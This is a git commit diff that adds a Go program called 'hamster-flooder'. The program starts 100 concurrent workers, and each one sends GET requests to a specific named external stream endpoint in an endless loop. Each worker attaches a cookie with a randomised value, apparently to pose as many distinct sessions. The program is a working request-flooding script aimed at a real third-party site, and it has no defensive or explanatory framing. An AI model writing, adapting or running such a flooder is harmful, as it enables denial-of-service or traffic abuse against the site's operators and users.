daa513d4ae1881648987a402256ca1b7c78f6d6d
anatolypaw <anatolypaw@gmail.com>
2024-06-07 20:36:25 +0600

    done

--- cmd/hamster-flooder.go
+++ cmd/hamster-flooder.go
@@ -1,7 +1,59 @@
 package main
 
-import "fmt"
+import (
+	"fmt"
+	"log"
+	"math/rand"
+	"net/http"
+	"sync"
+	"time"
+)
+
+var letterRunes = []rune("abcdefg1234567890")
+
+func RandStringRunes(n int) string {
+	b := make([]rune, n)
+	for i := range b {
+		b[i] = letterRunes[rand.Intn(len(letterRunes))]
+	}
+	return string(b)
+}
 
 func main() {
-	fmt.Println("hello")
+	var wg sync.WaitGroup
+	client := &http.Client{}
+	client.Timeout = 2000 * time.Millisecond
+
+	for i := 0; i < 100; i++ {
+		wg.Add(1)
+		go func() {
+			defer wg.Done()
+			Worker(*client)
+		}()
+	}
+
+	wg.Wait()
+	log.Print("Done")
+}
+
+func Worker(client http.Client) {
+	req, err := http.NewRequest("GET", "https://stream.nknikolay.ru/st.php", nil)
+	if err != nil {
+		log.Print(err)
+	}
+
+	cookie := http.Cookie{
+		Name:  "st",
+		Value: "66631" + RandStringRunes(8),
+	}
+	req.AddCookie(&cookie)
+
+	for {
+		resp, err := client.Do(req)
+		if err != nil {
+			log.Print(err)
+			continue
+		}
+		fmt.Println(resp.StatusCode)
+	}
 }
